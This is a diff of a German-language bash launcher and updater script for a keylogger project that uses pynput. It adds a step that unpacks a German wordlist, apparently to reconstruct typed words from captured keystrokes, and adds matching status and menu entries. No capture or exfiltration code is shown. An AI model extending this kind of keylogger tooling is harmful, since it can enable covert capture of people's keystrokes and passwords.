@@ -13,6 +13,8 @@ GITHUB_REPO="lzwdev/Keylogger"
 GITHUB_BRANCH="main"
 ZIP_URL="https://github.com/${GITHUB_REPO}/archive/refs/heads/${GITHUB_BRANCH}.zip"
 INFO_FILE="info.txt"
+WORDLIST_ZIP="wordlist-german.txt.zip"
+WORDLIST_FILE="wordlist-german.txt"
 PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 REQUIRED_PY_MODULES=("requests" "pynput")
@@ -82,7 +84,6 @@ get_remote_lastupdate() {
 # ---------- ASCII-Hilfen ----------
 BOX_W=58
 
-# Zeile im Rahmen – Rahmen blau, Text bleibt wie übergeben
 box_line() {
     local text="$1"
     local clean
@@ -93,7 +94,6 @@ box_line() {
     printf "${C_BLUE}│${C_RESET} %s%*s ${C_BLUE}│${C_RESET}\n" "$text" "$pad" ""
 }
 
-# Trennlinie mit optionalem farbigem Label
 box_sep() {
     local label="$1"
     if [ -z "$label" ]; then
@@ -113,6 +113,51 @@ box_sep() {
 
 box_top()    { printf "${C_BLUE}╭${C_RESET}"; printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}╮${C_RESET}\n"; }
 box_bottom() { printf "${C_BLUE}╰${C_RESET}"; printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}╯${C_RESET}\n"; }
+
+# ---------- Wörterbuch entpacken ----------
+# Sucht wordlist-german.txt.zip im Projektordner und entpackt sie zu wordlist-german.txt
+extract_wordlist() {
+    local zip="$PROJECT_DIR/$WORDLIST_ZIP"
+    local target="$PROJECT_DIR/$WORDLIST_FILE"
+
+    if [ ! -f "$zip" ]; then
+        # Keine ZIP vorhanden – prüfen, ob die .txt schon entpackt ist
+        if [ -f "$target" ]; then
+            echo "${C_GRAY}  Wörterbuch bereits entpackt: $WORDLIST_FILE${C_RESET}"
+        else
+            echo "${C_YELLOW}  ! Weder $WORDLIST_ZIP noch $WORDLIST_FILE gefunden${C_RESET}"
+            echo "${C_GRAY}    Intelligente Texterkennung läuft ohne Wörterbuch.${C_RESET}"
+        fi
+        return 0
+    fi
+
+    echo "${C_CYAN}  → Entpacke Wörterbuch: $WORDLIST_ZIP${C_RESET}"
+
+    if ! unzip -qo "$zip" -d "$PROJECT_DIR"; then
+        echo "${C_RED}  ✗ Entpacken fehlgeschlagen: $WORDLIST_ZIP${C_RESET}"
+        return 1
+    fi
+
+    # Sicherstellen, dass die .txt im Projektordner liegt (manche ZIPs haben Unterordner)
+    if [ ! -f "$target" ]; then
+        # Suchen und ggf. an die richtige Stelle verschieben
+        local found
+        found=$(find "$PROJECT_DIR" -maxdepth 2 -type f -name "$WORDLIST_FILE" | head -1)
+        if [ -n "$found" ] && [ "$found" != "$target" ]; then
+            mv "$found" "$target"
+        fi
+    fi
+
+    if [ -f "$target" ]; then
+        local size_human
+        size_human=$(du -h "$target" | awk '{print $1}')
+        echo "${C_GREEN}  ✓ Wörterbuch entpackt: $WORDLIST_FILE ($size_human)${C_RESET}"
+    else
+        echo "${C_RED}  ✗ $WORDLIST_FILE nach Entpacken nicht gefunden${C_RESET}"
+        return 1
+    fi
+    return 0
+}
 
 # ---------- Update-Check ----------
 check_update() {
@@ -206,7 +251,7 @@ check_update() {
     fi
     echo
 
-    echo "${C_CYAN}[i] Entpacke …${C_RESET}"
+    echo "${C_CYAN}[i] Entpacke Projekt-Archiv …${C_RESET}"
     if ! unzip -qo "$zip_path" -d "$tmp_dir"; then
         echo "${C_RED}[!] Entpacken fehlgeschlagen.${C_RESET}"
         rm -rf "$tmp_dir"
@@ -221,6 +266,7 @@ check_update() {
         return 1
     fi
 
+    # Backup des alten Ordners
     local backup_dir="${PROJECT_DIR}.bak.$(date +%Y%m%d%H%M%S)"
     echo "${C_CYAN}[i] Ersetze Projektordner …${C_RESET}"
 
@@ -239,7 +285,18 @@ check_update() {
 
     rm -rf "$tmp_dir"
 
+    # Wörterbuch entpacken (falls wordlist-german.txt.zip vorhanden)
     echo
+    box_top
+    box_line "${C_BOLD}${C_CYAN}WÖRTERBUCH${C_RESET}"
+    box_sep ""
+    if ! extract_wordlist; then
+        box_line "${C_YELLOW}  (Skript läuft trotzdem, nur ohne Wortliste)${C_RESET}"
+    fi
+    box_bottom
+    echo
+
+    # Abschluss
     box_top
     box_line "${C_GREEN}${C_BOLD}✓ UPDATE ERFOLGREICH${C_RESET}"
     box_sep ""
@@ -373,7 +430,6 @@ start_kl() {
     fi
 }
 
-# Stoppen: beendet den Prozess wirklich
 stop_kl() {
     if ! is_running; then
         echo "${C_GRAY}[i] War nicht aktiv.${C_RESET}"
@@ -386,20 +442,16 @@ stop_kl() {
     echo "${C_CYAN}[i]${C_RESET} Stoppe Prozess ${C_BOLD}PID $pid${C_RESET} …"
 
     kill "$pid" 2>/dev/null
-
-    # Bis zu 3 Sekunden auf sauberes Beenden warten
     local waited=0
     while kill -0 "$pid" 2>/dev/null && [ "$waited" -lt 3 ]; do
         sleep 0.5
         waited=$((waited + 1))
     done
-
     if kill -0 "$pid" 2>/dev/null; then
         echo "${C_YELLOW}[!] Reagiert nicht – erzwinge Beenden …${C_RESET}"
         kill -9 "$pid" 2>/dev/null
         sleep 0.5
     fi
-
     rm -f "$PIDFILE"
 
     if kill -0 "$pid" 2>/dev/null; then
@@ -419,6 +471,16 @@ show_status() {
     printf " %-13s %s\n" "Skript:"      "${C_CYAN}${PY:-<nicht gefunden>}${C_RESET}"
     printf " %-13s %s\n" "Projekt:"     "${C_GRAY}$PROJECT_DIR${C_RESET}"
     printf " %-13s %s\n" "Logs:"        "${C_GRAY}$LOG_DIR${C_RESET}"
+
+    # Wörterbuch-Status
+    if [ -f "$PROJECT_DIR/$WORDLIST_FILE" ]; then
+        printf " %-13s %s\n" "Wörterbuch:" "${C_GREEN}✓${C_RESET} ${C_GRAY}$WORDLIST_FILE${C_RESET}"
+    elif [ -f "$PROJECT_DIR/$WORDLIST_ZIP" ]; then
+        printf " %-13s %s\n" "Wörterbuch:" "${C_YELLOW}!${C_RESET} ${C_GRAY}$WORDLIST_ZIP (noch nicht entpackt)${C_RESET}"
+    else
+        printf " %-13s %s\n" "Wörterbuch:" "${C_RED}✗${C_RESET} ${C_GRAY}nicht gefunden${C_RESET}"
+    fi
+
     if [ -s "$ERRLOG" ]; then
         echo
         echo " ${C_RED}Letzte Fehler:${C_RESET}"
@@ -501,6 +563,15 @@ while true; do
     printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Version"     "${C_BOLD}$(get_local_version || echo 'unbekannt')${C_RESET}"
     printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Last Update" "${C_GRAY}$(get_local_lastupdate || echo 'unbekannt')${C_RESET}"
     printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Skript"      "${C_CYAN}${PY:-<nicht gefunden>}${C_RESET}"
+
+    if [ -f "$PROJECT_DIR/$WORDLIST_FILE" ]; then
+        printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Wörterbuch" "${C_GREEN}✓${C_RESET} ${C_GRAY}bereit${C_RESET}"
+    elif [ -f "$PROJECT_DIR/$WORDLIST_ZIP" ]; then
+        printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Wörterbuch" "${C_YELLOW}!${C_RESET} ${C_GRAY}$WORDLIST_ZIP (nicht entpackt)${C_RESET}"
+    else
+        printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Wörterbuch" "${C_RED}✗${C_RESET} ${C_GRAY}nicht gefunden${C_RESET}"
+    fi
+
     echo
     echo "  ${C_BLUE}─────────────────────────────────────${C_RESET}"
     echo
@@ -511,6 +582,7 @@ while true; do
     echo "   ${C_CYAN}${C_BOLD}5${C_RESET}   Live-Verlauf"
     echo "   ${C_MAGENTA}${C_BOLD}6${C_RESET}   Abhängigkeiten prüfen"
     echo "   ${C_MAGENTA}${C_BOLD}7${C_RESET}   Nach Updates suchen"
+    echo "   ${C_MAGENTA}${C_BOLD}8${C_RESET}   Wörterbuch entpacken"
     echo
     echo "   ${C_GRAY}${C_BOLD}q${C_RESET}   Beenden"
     echo
@@ -525,6 +597,7 @@ while true; do
         5) follow_live ;;
         6) ensure_dependencies; read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
         7) check_update;        read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
+        8) extract_wordlist;    read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
         q|Q) exit 0 ;;
         *) echo "   ${C_RED}[!] Ungültig.${C_RESET}"; sleep 1 ;;
     esac
